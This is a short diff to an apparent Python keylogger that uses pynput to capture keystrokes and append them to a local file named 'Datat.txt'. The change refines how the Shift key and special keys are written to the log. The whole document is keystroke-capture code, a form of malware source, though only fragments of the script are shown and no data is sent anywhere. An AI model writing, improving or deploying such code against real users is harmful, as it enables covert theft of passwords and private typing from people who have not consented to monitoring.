@@ -1,8 +1,6 @@
 import os
 import sys
 from pynput import keyboard
-from pynput.keyboard import Listener
-
 
 # Checks for "Key." keys
 def ispecial(value):
@@ -38,10 +36,10 @@ def write(key):
 
     # With file open with reading and writing permissions write and close the 'keydata' as sting characters
     with open('Datat.txt', 'a') as file:
-        if nospecial(keydata) == False:
+        if nospecial(keydata) == False or "Key.shift" in keydata:
             file.write(keydata)
 
-        if ispecial(keydata) == True:
+        if ispecial(keydata) == True and keydata != "Key.shift":
             file.write("\n")
 
     file.close()
